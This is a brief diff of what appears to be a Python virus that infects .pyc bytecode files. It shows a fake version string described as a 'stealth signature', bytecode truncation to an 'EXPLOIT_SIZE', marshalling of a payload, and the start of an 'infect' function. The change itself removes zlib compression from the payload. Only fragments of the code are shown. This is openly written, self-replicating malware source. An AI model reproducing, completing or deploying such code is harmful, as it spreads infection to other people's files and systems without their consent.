@@ -1,9 +1,7 @@
 __py_version__ = "PY_2.6" # haha bullshit, this is a stealth signature
 # -*- coding: utf-8 -*-
-
 import socket
 import marshal
-import zlib
 import glob
 
 a = None
@@ -42,7 +40,7 @@ if __file__.endswith('.pyc'):
     data.code = data.code[:EXPLOIT_SIZE]
     data.code.append((LOAD_CONST, None))
     data.code.append((RETURN_VALUE, None))
-    payload_clear = zlib.compress(marshal.dumps(data.to_code()), 9)
+    payload_clear = marshal.dumps(data.to_code())
 
     def infect(f_to_infect):
         #print "j'infecte %s" % f_to_infect
